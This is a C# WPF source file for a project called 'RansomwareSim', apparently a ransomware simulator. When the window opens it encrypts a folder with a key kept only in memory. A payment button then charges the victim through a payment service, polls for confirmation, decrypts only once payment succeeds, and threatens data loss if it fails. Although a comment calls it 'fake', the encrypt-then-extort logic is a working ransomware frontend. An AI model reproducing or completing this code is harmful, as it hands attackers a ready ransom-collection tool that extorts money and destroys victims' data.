using RansomwareSim.Service;
using System.Diagnostics;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using RansomwareSim.Service;

namespace RansomwareSim
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        byte[] key = RandomNumberGenerator.GetBytes(32);
        public MainWindow()
        {
            InitializeComponent();

            

            EncryptionService.EncryptFolder(
                @"enter common file paths",
                key
            );



        }

        //payment button for fake ransomware
        private async void Button_Click(object sender, RoutedEventArgs e)
        {

            //making payment
            var paymentService = new PaymentService();

            var payment = await paymentService.InitializePayment(
     txtEmail.Text,
     50000
 );
           

            // Open browser
            Process.Start(new ProcessStartInfo
            {
                FileName = payment.AuthorizationUrl,
                UseShellExecute = true
            });

           

            // Give the user time to pay
            await Task.Delay(5000);

            for (int i = 0; i < 40; i++) // Check for up to 2 minutes
            {
                string status = await paymentService.VerifyPayment(payment.Reference);

                if (status == "success")
                {
                    MessageBox.Show("Payment Successful!");
                    EncryptionService.DecryptFolder(
                     @"TestFolder\ex.zip.enc",
                     @"TestFolder\ex",
                     key);
                    this.Close();
                    return;
                }

                if (status == "failed")
                {
                    MessageBox.Show("Payment Failed. Please take it serious or you will lose your Data.");
                    return;
                }

                // Continue checking if still pending or abandoned
                await Task.Delay(3000);
            }

            MessageBox.Show("Payment timed out.");

        }
    }
        }
    

